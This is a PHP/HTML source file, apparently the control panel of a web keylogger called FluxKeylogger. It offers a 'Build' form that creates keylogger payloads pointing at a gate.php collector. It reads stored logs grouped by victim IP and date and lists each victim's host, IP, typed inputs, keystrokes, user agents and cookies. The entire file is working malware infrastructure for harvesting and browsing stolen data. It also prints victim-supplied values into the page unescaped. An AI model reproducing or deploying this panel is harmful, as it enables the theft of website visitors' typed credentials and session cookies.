<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FluxKeylogger - Control</title>
    <link rel="icon" type="image/png" href="http://icons.iconarchive.com/icons/hopstarter/malware/128/Infect-icon.png" />

    <!-- Styles & Scripts -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
    <script src="includes/scripts.js"></script>
    <style>
        body {
            background-color: #111111;
            font-family: 'Ubuntu', sans-serif;
        }

        .i {
            position: relative;
            top: 5px;
        }

        .sinfo:hover,
        .skeylogs:hover,
        .rlogs:hover {
            cursor: pointer;
        }

        .sinfo:hover {
            color: #9999ff;
        }

        .skeylogs:hover {
            color: #ff8000;
        }

        .rlogs:hover {
            color: #ff4d4d;
        }
    </style>
</head>
<body>
    <!-- NAVBAR -->
    <?php
    function get_dirs($dir = '')
    {
        return array_filter(glob('logs/' . $dir . '*'), 'is_dir');
    }

    function get_files($dir = '')
    {
        return array_filter(glob($dir . '*.log'), 'is_file');
    }
    ?>
    <nav class="navbar navbar-expand-xl navbar-dark bg-dark">
        <a class="navbar-brand" href="#"> <i class="i material-icons">remove_red_eye</i> Flux</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarToggle" aria-controls="navbarToggle" aria-expanded="true" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="navbar-collapse collapse show" id="navbarToggle">
            <ul class="navbar-nav mr-auto">
                <li class="nav-item">
                    <a class="nav-link" href="#" data-toggle="modal" data-target="#buildModal"> <i class="i material-icons">build</i> Build</a>
                </li>
            </ul>
            <form class="form-inline my-2 my-md-0">
                <div class="input-group-prepend">
                    <div class="input-group-text"><i class="material-icons">search</i></div>
                    <input class="form-control" type="text" id="logsSearch" placeholder="Search">
                </div>
            </form>
        </div>
    </nav>

    <!-- BUILD Modal -->
    <div class="modal fade" id="buildModal" tabindex="" role="dialog" aria-labelledby="buildModalLabel" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title" id="buildModalLabel">Create keylogger</h5>
                    <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                        <span aria-hidden="true">&times;</span>
                    </button>
                </div>
                <div class="modal-body">
                    <label for="buildName">Name:</label>
                    <input id="buildName" type="text" value="<?php echo rand(0, 99999999999999); ?>" class="form-control" placeholder="Name of keylogger">
                    <label for="buildGate">Gate:</label>
                    <input id="buildGate" type="text" value="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . str_replace('flux.php', '', $_SERVER['REQUEST_URI']) . 'gate.php'; ?>" class="form-control" placeholder="gate.php location">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" onclick="buildCreate();">Create</button>
                </div>
            </div>
        </div>
    </div>

    <!-- TABLE -->
<table class="table table-dark table-hover mt-3" id="logsTable">
    <thead>
        <tr>
            <th scope="col">ID</th>
            <th scope="col">Host <i class="i material-icons">router</i></th>
            <th scope="col">Remote IP <i class="i material-icons">gps_fixed</i></th>
            <th scope="col">Date <i class="i material-icons">date_range</i></th>
            <th scope="col">Input <i class="i material-icons">input</i></th>
            <th scope="col">Cookies <i class="i material-icons">settings</i></th>
        </tr>
    </thead>
    <tbody>
        <?php
        $data = array();

        foreach (get_dirs() as $ip_dir) {
            foreach (get_dirs(explode("/", $ip_dir)[1] . '/') as $date_dir) {
                foreach (get_files($date_dir . '/') as $log_file) {
                    $i = json_decode(file_get_contents($log_file), true);

                    $remote_ip = $i["remote_ip"];
                    $location = $i["location"];
                    $uagents = $i["uagents"];
                    $cookies = $i["cookies"];
                    $name = $i["name"];
                    $host = $i["host"];
                    $date = $i["date"];
                    $time = $i["time"];
                    $inputs = $i["inputs"];

                    // Check if $inputs is empty and skip this row if it is
                    if (empty($inputs)) {
                        continue;
                    }

                    $keylogs = str_replace([" <Shift> ", "<TAB>"], ['', '\n'], $i["keyLogs"]);

                    // Store data in an array with timestamp for sorting
                    $timestamp = strtotime("$date $time");
                    $data[] = [
                        'host' => $host,
                        'remote_ip' => $remote_ip,
                        'date' => $date,
                        'time' => $time,
                        'inputs' => $inputs,
                        'cookies' => $cookies,
                        'timestamp' => $timestamp,
                    ];
                }
            }
        }

        // Sort data by timestamp in descending order
        usort($data, function ($a, $b) {
            return $b['timestamp'] - $a['timestamp'];
        });

        $id = 1; // Initialize ID to 1

        foreach ($data as $row) {
            echo "
                <tr>
                    <td>$id</td>
                    <td><a style='color: white;' href='http://{$row['host']}'>{$row['host']}</a></td>
                    <td>{$row['remote_ip']}</td>
                    <td>{$row['time']} - {$row['date']}</td>
                    <td>{$row['inputs']}</td>
                    <td>
                        <i title='Show information' class='sinfo material-icons' onclick=\"read_log('{$row['remote_ip']}', '$location', '{$row['host']}', '$uagents', '{$row['cookies']}', '{$row['date']}', '{$row['time']}', '$name');\">credit_card</i>
                        <i title='Remove log' class='rlogs material-icons' onclick=\"remove_log('$log_file', this);\">delete_forever</i>
                    </td>
                </tr>";

            $id++; // Increment the ID
        }
        ?>
    </tbody>
</table>
</body>
</html>
